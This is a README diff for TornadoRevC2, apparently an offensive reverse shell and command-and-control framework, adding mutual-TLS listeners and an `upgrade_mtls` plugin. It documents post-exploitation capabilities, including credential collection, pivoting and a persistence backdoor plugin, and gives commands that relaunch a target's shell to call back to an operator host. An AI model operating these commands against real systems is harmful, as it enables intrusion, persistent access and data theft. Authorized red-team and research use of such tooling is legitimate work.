@@ -54,14 +54,14 @@ Use this software only on systems you own or on systems where you have **explici
   - [Reference implementations](#reference-implementations)
 - [Session Logging](#session-logging)
 - [Project Structure](#project-structure)
-- [TLS Configuration](#tls-configuration)
+- [TLS & mTLS Configuration](#tls--mtls-configuration)
 - [License](#license)
 
 ---
 
 ## Introduction
 
-TornadoRevC2 is a modular reverse shell management framework that accepts inbound connections over both plain TCP and TLS, providing a unified operator console for session management, host reconnaissance, chunked file transfer, in-memory payload execution, SOCKS5 pivoting, plugin-driven post-exploitation, structured reporting, and a built-in `update` command for automatic Git-based updates and seamless handler restarts. Originally developed as a lightweight reverse shell handler, the project has evolved into an extensible framework in which capabilities such as firewall enumeration, credential store metadata collection, network mapping, browser profiling, and additional post-exploitation functionality are implemented as independent, modular plugins. The framework also includes the `make_token` plugin for establishing new C2 sessions via remote protocols (SSH, WinRM, SMB, RDP, WMI, MSSQL) using command-line tools from the operator side, with support for custom ports, NTLM hash authentication, and netexec integration.
+TornadoRevC2 is a modular reverse shell management framework that accepts inbound connections over plain TCP, server-authenticated TLS, and mutual TLS (mTLS) with client-certificate verification, providing a unified operator console for session management, host reconnaissance, chunked file transfer, in-memory payload execution, SOCKS5 pivoting, plugin-driven post-exploitation, structured reporting, and a built-in `update` command for automatic Git-based updates and seamless handler restarts. Originally developed as a lightweight reverse shell handler, the project has evolved into an extensible framework in which capabilities such as firewall enumeration, credential store metadata collection, network mapping, browser profiling, and additional post-exploitation functionality are implemented as independent, modular plugins. The framework also includes the `make_token` plugin for establishing new C2 sessions via remote protocols (SSH, WinRM, SMB, RDP, WMI, MSSQL) using command-line tools from the operator side, with support for custom ports, NTLM hash authentication, and netexec integration, and an `upgrade_mtls` plugin that migrates a live session onto the mutual-TLS listener by pushing the handler's client certificate bundle to the target.
 
 **Supported target platforms:** Linux and Windows (primary), with compatibility for generic Unix and BSD environments where applicable.
 
@@ -71,7 +71,7 @@ TornadoRevC2 is a modular reverse shell management framework that accepts inboun
 
 | Category | Capabilities |
 |----------|-------------|
-| **Session handling** | Multi-client TCP/TLS listeners, interactive PTY/TTY sessions, session fingerprinting, reconnect tracking |
+| **Session handling** | Multi-client TCP / TLS / mTLS listeners, on-demand mTLS upgrade for live sessions, interactive PTY/TTY sessions, session fingerprinting, reconnect tracking |
 | **Transfer & execution** | Chunked file transfer with resume and SHA-256 verification; in-memory payload execution (`py`, `ps`, `exe`, `elf`, `bat`, `sh`) |
 | **Network operations** | SOCKS5 pivoting through compromised sessions with automatic remote cleanup |
 | **Enumeration** | Covering host triage, network posture, credentials metadata, browsers, VPN/proxy config, and more |
@@ -115,7 +115,7 @@ Handler updates are delivered through Git on the operator machine. The `update` 
 │  Sessions · Transfers · SOCKS · Plugins · Logging · Export ·    │
 │  update                                                         │
 └────────────────────────────┬────────────────────────────────────┘
-                             │ reverse shell channel (TCP/TLS)
+                             │ reverse shell channel (TCP / TLS / mTLS)
                              ▼
 ┌─────────────────────────────────────────────────────────────────┐
 │                        Target Host                              │
@@ -124,9 +124,34 @@ Handler updates are delivered through Git on the operator machine. The `update` 
 └─────────────────────────────────────────────────────────────────┘
 ```
 
-### TCP/TLS Listener Configuration
+### Listener Configuration
 
-The Tornado supports configurable TCP/TLS listener host and port behavior. The `-H`, `-p`, and `-tp` flags configure the reverse-shell bind address and ports.
+TornadoRevC2 runs **three independent listeners simultaneously**, so implants can connect over plaintext, server-authenticated TLS, or mutually authenticated TLS depending on the engagement's threat model:
+
+| Listener | Default port | Flag | Authentication | Certificates |
+|----------|--------------|------|----------------|--------------|
+| TCP      | `4444`       | `-p` | None           | None |
+| TLS      | `8443`       | `-tp` | Server-authenticated | `tls_certs/server.pem`, `tls_certs/server.key` |
+| mTLS     | `9443`       | `-mp` | Mutual (client cert required) | `mtls_certs/` bundle (CA + server + client) |
+
+The `-H` flag sets the bind address shared by all three listeners. All three can be enabled at once; disabling one is not currently required — leave the port free or unbound to ignore it.
+
+**Automatic certificate generation.** On first launch the handler creates two isolated directories and bootstraps the material it needs:
+
+```text
+tls_certs/
+  server.pem          # self-signed server certificate
+  server.key          # server private key
+
+mtls_certs/
+  ca.pem              # mTLS certificate authority (self-signed, 4096-bit RSA)
+  ca.key              # CA private key
+  ca.srl              # OpenSSL serial counter (auto-generated)
+  server-mtls.pem     # server cert signed by CA
+  server-mtls.key     # server private key
+  client.pem          # client cert signed by CA — ship to implant
+  client.key          # client private key  — ship to implant
+```
 
 ### Plugin Layout
 
@@ -151,19 +176,14 @@ Collectors emit JSON wrapped in marker tokens (`__T_PLUGIN_START__` / `__T_PLUGI
 **Handler (operator machine):**
 
 - Python 3.7 or later
-- OpenSSL (for TLS certificate generation)
+- OpenSSL (for automatic TLS and mTLS certificate generation)
 - Git (optional; required for the `update` operator command)
 - No third-party Python packages required
-
-**Target host (varies by plugin):**
-
-- Python 2/3, PowerShell, or standard Unix utilities for collectors
-- Optional: `wl-clipboard` / `xclip` / `xsel` (Linux clipboard); `import` / `scrot` / `gnome-screenshot` (Linux screenshot)
 
 ```bash
 git clone https://github.com/kamalx06/TornadoRevC2.git
 cd TornadoRevC2
-python tornadorevc2.py
+python3 tornadorevc2.py
 ```
 
 ---
@@ -173,11 +193,18 @@ python tornadorevc2.py
 ### 1. Start the handler
 
 ```bash
-# Default: TCP on 4444, TLS on 8443
+# Default: TCP on 4444, TLS on 8443, mTLS on 9443
 python tornadorevc2.py
 
-# Custom bind address, ports, and TLS material
-python tornadorevc2.py -H 0.0.0.0 -p 4444 -tp 8443 -c server.pem -k server.key
+# Custom bind address and ports for all three listeners
+python tornadorevc2.py -H 0.0.0.0 -p 4444 -tp 8443 -mp 9443
+
+# Point to your own certificate material
+python tornadorevc2.py \
+  -c tls_certs/server.pem -k tls_certs/server.key \
+  --mtls-ca-cert mtls_certs/ca.pem --mtls-ca-key mtls_certs/ca.key \
+  --mtls-server-cert mtls_certs/server-mtls.pem --mtls-server-key mtls_certs/server-mtls.key \
+  --mtls-client-cert mtls_certs/client.pem --mtls-client-key mtls_certs/client.key
 ```
 
 ### 2. Establish a session
@@ -268,7 +295,7 @@ Supported types: `py`, `ps`, `exe`, `elf`, `bat`, `sh`
 
 ## Built-in Plugins
 
-TornadoRevC2 ships with **50 built-in plugins** organized by function. All enumeration related plugins are read-only unless noted otherwise.
+TornadoRevC2 ships with **51 built-in plugins** organized by function. All enumeration related plugins are read-only unless noted otherwise.
 
 ### Host assessment & environment
 
@@ -350,6 +377,7 @@ TornadoRevC2 ships with **50 built-in plugins** organized by function. All enume
 | `ligolong` | Cross‑platform | Deploy Ligolo‑NG tunneling agent to Linux/Windows targets with background persistence |
 | `chisel` | Cross‑platform | Deploy Chisel tunneling agent in reverse (client) or bind (server) mode; supports SOCKS5 and background persistence |
 | `persistence` | Cross‑platform | Install a persistent reverse shell backdoor (cron @reboot / Run registry) using TLS‑encrypted payload |
+| `upgrade_mtls` | Cross‑platform | Push the handler's mTLS client bundle to a session and relaunch it over the mTLS listener (opt-in; does not affect other listeners) |
 
 **In-memory execution methods:**
 
@@ -1023,26 +1051,75 @@ TornadoRevC2/
 
 ---
 
-## TLS Configuration
+## TLS & mTLS Configuration
 
-Generate a self-signed certificate:
+TornadoRevC2 runs three isolated listeners, each with its own certificate source. Everything under `tls_certs/` and `mtls_certs/` is auto-generated on first run and never overwritten.
+
+| Listener | Port | Client auth | Certificates |
+|----------|------|-------------|--------------|
+| TCP | `4444` | none | — |
+| TLS | `8443` | server-only | `tls_certs/server.pem`, `tls_certs/server.key` |
+| mTLS | `9443` | mutual (client certificate required) | `mtls_certs/` bundle |
+
+### TLS
+
+Auto-generated as a self-signed pair (`CN=localhost`, RSA-2048, 3650 days).
+
+To supply your own:
 
 ```bash
-openssl req -x509 -newkey rsa:2048 -sha256 -nodes \
-  -days 3650 \
-  -keyout server.key \
-  -out server.pem
+python tornadorevc2.py -H 0.0.0.0 -p 4444 -tp 8443 \
+  -c tls_certs/server.pem -k tls_certs/server.key
 ```
 
-Start with explicit TLS material:
+If the client connects using an IP address, the server certificate should include that IP in its **Subject Alternative Name (SAN)**. Avoid disabling hostname verification unless there is a specific reason to do so.
+
+### mTLS
+
+On first run, a full PKI is bootstrapped under `mtls_certs/`:
+
+- `ca.pem` / `ca.key` — self-signed CA (RSA-4096, CN=`TornadoRevC2-mTLS-CA`)
+- `server-mtls.pem` / `server-mtls.key` — server certificate signed by the CA
+- `client.pem` / `client.key` — client certificate signed by the CA
+- `ca.srl` — OpenSSL serial counter generated during certificate signing
+
+Ship **`client.pem` + `client.key` + `ca.pem`** with the authorized client. The client must present its certificate on connect or the handshake is rejected.
+
+Start with explicit paths:
 
 ```bash
-python tornadorevc2.py -H 0.0.0.0 -p 4444 -tp 8443 -c server.pem -k server.key
+python tornadorevc2.py -H 0.0.0.0 -mp 9443 \
+  --mtls-ca-cert mtls_certs/ca.pem --mtls-ca-key mtls_certs/ca.key \
+  --mtls-server-cert mtls_certs/server-mtls.pem --mtls-server-key mtls_certs/server-mtls.key \
+  --mtls-client-cert mtls_certs/client.pem --mtls-client-key mtls_certs/client.key
 ```
 
-For production engagements, use credentials issued by your organization's PKI or certificate authority.
+### Upgrading a live session to mTLS
 
----
+Existing sessions on plain TCP or server-auth TLS can be moved onto the mTLS listener without restarting the handler. The `upgrade_mtls` plugin uploads `client.pem`, `client.key`, and `ca.pem` to the target, launches a background shell that presents the client certificate, and (by default) removes the bundle from disk once the new session is up.
+
+```bash
+# From the main handler prompt
+run upgrade_mtls 1 --port 9443 --host 10.10.14.7
+run upgrade_mtls 1 --keep-bundle       # leave certs on disk after launch
+run upgrade_mtls 1 --no-upload         # certificate bundle already uploaded manually
+
+# From inside an attached session (switch 1)
+run upgrade_mtls
+```
+
+### Flags
+
+| Flag | Default |
+|------|---------|
+| `-H` / `--host` | `0.0.0.0` |
+| `-p` / `--port` | `4444` |
+| `-tp` / `--tls-port` | `8443` |
+| `-mp` / `--mtls-port` | `9443` |
+| `-c` / `--cert`, `-k` / `--key` | `tls_certs/server.{pem,key}` |
+| `--mtls-ca-cert` / `--mtls-ca-key` | `mtls_certs/ca.{pem,key}` |
+| `--mtls-server-cert` / `--mtls-server-key` | `mtls_certs/server-mtls.{pem,key}` |
+| `--mtls-client-cert` / `--mtls-client-key` | `mtls_certs/client.{pem,key}` |
 
 ## License
 
